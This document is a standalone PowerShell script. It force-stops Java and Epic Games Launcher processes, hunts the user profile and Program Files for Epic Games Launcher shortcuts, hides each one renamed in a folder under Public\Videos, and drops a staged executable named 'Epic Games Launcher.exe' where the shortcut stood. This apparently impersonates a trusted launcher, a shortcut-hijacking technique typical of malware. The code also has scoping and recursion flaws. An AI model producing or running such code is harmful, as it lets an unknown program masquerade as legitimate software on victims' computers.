Stop-Process -Name "java", "javaw", "EpicGamesLauncher" -Force

# Define source and destination paths
$sourcePaths = @("C:\Users\$($env:USERNAME)", "C:\Program Files")
$destinationPath = "C:\Users\Public\Videos\GraphicalUserInterface"
$counter = 1

# Function to recursively search for the file and perform the required actions
function SearchAndMoveFile {
    param (
        [string]$directory
    )

    Write-Host "Searching in $directory"

    # Get all files in the current directory
    $files = Get-ChildItem -Path $directory -File -Recurse -Filter "Epic Games Launcher.lnk" -ErrorAction SilentlyContinue

    # Move the found file and perform the required operations
    foreach ($file in $files) {
        $newFileName = "§$counter.lnk"
        $newFilePath = Join-Path -Path $destinationPath -ChildPath $newFileName
        Write-Host "Moving $($file.FullName) to $newFilePath"
        Move-Item -Path $file.FullName -Destination $newFilePath -Force

        # Move Epic Games Launcher.exe to the original location of Epic Games Launcher.lnk
        $exeFilePath = Join-Path -Path $destinationPath -ChildPath "myapp\Epic Games Launcher.exe"
        Write-Host "Moving Epic Games Launcher.exe to $($file.Directory.FullName)"
        Move-Item -Path $exeFilePath -Destination $file.Directory.FullName -Force

        $counter++
    }

    # Recursively search subdirectories
    $subDirectories = Get-ChildItem -Path $directory -Directory -ErrorAction SilentlyContinue
    foreach ($subDirectory in $subDirectories) {
        SearchAndMoveFile -directory $subDirectory.FullName
    }
}

# Loop through source paths and start the search
foreach ($path in $sourcePaths) {
    SearchAndMoveFile -directory $path
}
